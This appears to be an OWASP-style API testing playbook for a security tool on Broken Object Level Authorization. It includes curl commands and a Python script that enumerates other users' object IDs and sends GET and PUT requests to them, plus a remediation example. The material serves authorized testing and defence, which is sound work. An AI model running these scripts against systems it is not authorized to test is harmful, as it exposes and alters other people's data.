---
name: wstg-apit-02
description: "Testing for Broken Object Level Authorization (BOLA)"
category: api-testing
owasp_id: WSTG-APIT-02
version: "1.0.0"
author: cyberstrike-official
tags: [api, rest, graphql, soap, wstg, apit]
tech_stack: []
cwe_ids: [CWE-200]
chains_with: []
prerequisites: []
severity_boost: {}
sha256: 6b746ddc83cd43bd714e47aec29662768b3c5b417dd16bf206fc297a43864f47
signature: NRBaz8UBJbNsMYV/YmyHg95gv6v+eWstGujofZLNb16okn1I2yqfBQXl+/IIsEu+rDj04ZG2cPlT7L84Bwm5BA==
signed_by: cyberstrike-official
---

# wstg-apit-02

## Test ID

WSTG-APIT-02

## Test Name

Testing for Broken Object Level Authorization (BOLA/IDOR)

## High-Level Description

Broken Object Level Authorization (BOLA), also known as IDOR, occurs when an API fails to validate that the requesting user has permission to access the requested object. Attackers can manipulate object identifiers to access data belonging to other users.

---

## What to Check

- [ ] User ID manipulation
- [ ] Resource ID tampering
- [ ] UUID/GUID enumeration
- [ ] Access control on all endpoints
- [ ] Horizontal privilege escalation
- [ ] Batch/bulk operations

---

## How to Test

### Step 1: Identify Object References

```bash
# Find endpoints with IDs
# /api/users/{id}
# /api/orders/{id}
# /api/documents/{id}

# Test with different IDs
curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/100" | jq '.'

curl -s -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/users/101" | jq '.'
```

### Step 2: BOLA Testing Script

```python
#!/usr/bin/env python3
import requests

class BOLATester:
    def __init__(self, base_url, token, own_id):
        self.base_url = base_url
        self.own_id = own_id
        self.session = requests.Session()
        self.session.headers.update({"Authorization": f"Bearer {token}"})
        self.findings = []

    def test_endpoint(self, endpoint_template, target_ids):
        """Test BOLA on endpoint"""
        print(f"\n[*] Testing BOLA on {endpoint_template}")

        for target_id in target_ids:
            if str(target_id) == str(self.own_id):
                continue

            endpoint = endpoint_template.replace("{id}", str(target_id))
            url = f"{self.base_url}{endpoint}"

            # Test GET
            response = self.session.get(url)
            if response.status_code == 200:
                print(f"[VULN] BOLA: GET {endpoint}")
                self.findings.append({
                    "method": "GET",
                    "endpoint": endpoint,
                    "severity": "High"
                })

            # Test PUT
            response = self.session.put(url, json={"test": "data"})
            if response.status_code in [200, 204]:
                print(f"[VULN] BOLA: PUT {endpoint}")
                self.findings.append({
                    "method": "PUT",
                    "endpoint": endpoint,
                    "severity": "Critical"
                })

            # Test DELETE (be careful!)
            # response = self.session.delete(url)

    def test_body_parameters(self, endpoint, param_name, target_ids):
        """Test BOLA via body parameters"""
        print(f"\n[*] Testing body parameter BOLA: {param_name}")

        for target_id in target_ids:
            response = self.session.post(
                f"{self.base_url}{endpoint}",
                json={param_name: target_id}
            )

            if response.status_code == 200:
                data = response.json()
                # Check if we got other user's data
                if str(target_id) in str(data):
                    print(f"[VULN] BOLA via body param: {param_name}={target_id}")
                    self.findings.append({
                        "endpoint": endpoint,
                        "parameter": param_name,
                        "severity": "High"
                    })

    def generate_report(self):
        print("\n" + "="*50)
        print("BOLA TESTING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo BOLA vulnerabilities found.")
            return

        print(f"\nVulnerabilities: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f['severity']}] {f.get('method', 'POST')} {f['endpoint']}")

# Usage
tester = BOLATester(
    "https://target.com/api",
    "user_token",
    own_id=100
)

tester.test_endpoint("/users/{id}", range(95, 110))
tester.test_endpoint("/users/{id}/orders", range(95, 110))
tester.test_endpoint("/documents/{id}", range(1, 20))
tester.test_body_parameters("/user/data", "user_id", [101, 102, 103])
tester.generate_report()
```

---

## Remediation

```python
@app.route('/api/users/<int:user_id>')
@require_auth
def get_user(user_id):
    # ALWAYS verify ownership
    if user_id != current_user.id and not current_user.is_admin:
        abort(403)

    return User.query.get_or_404(user_id).to_dict()
```

---

## Risk Assessment

| Finding                  | CVSS | Severity |
| ------------------------ | ---- | -------- |
| Read other users' data   | 7.5  | High     |
| Modify other users' data | 8.1  | High     |
| Delete other users' data | 8.1  | High     |

---

## CWE Categories

| CWE ID      | Title                                            |
| ----------- | ------------------------------------------------ |
| **CWE-639** | Authorization Bypass Through User-Controlled Key |

sha256: 85b1f34398bc46c141a16d575e73fa5751fed1292dfd01d152e9e77a86b0091c
signature: tRmtoRIdpKrdd2rRzxrDqXh4C3r1yQvl56K0ELd2a0rIAmnqpsXyHRM0Eg1J5vviNpZiqMDQ2qKv2Govq9+WBQ==
signed_by: cyberstrike-official
---

## Checklist

```
[ ] Object references identified
[ ] ID manipulation tested
[ ] All HTTP methods tested
[ ] Body parameters tested
[ ] UUID enumeration attempted
[ ] Findings documented
```
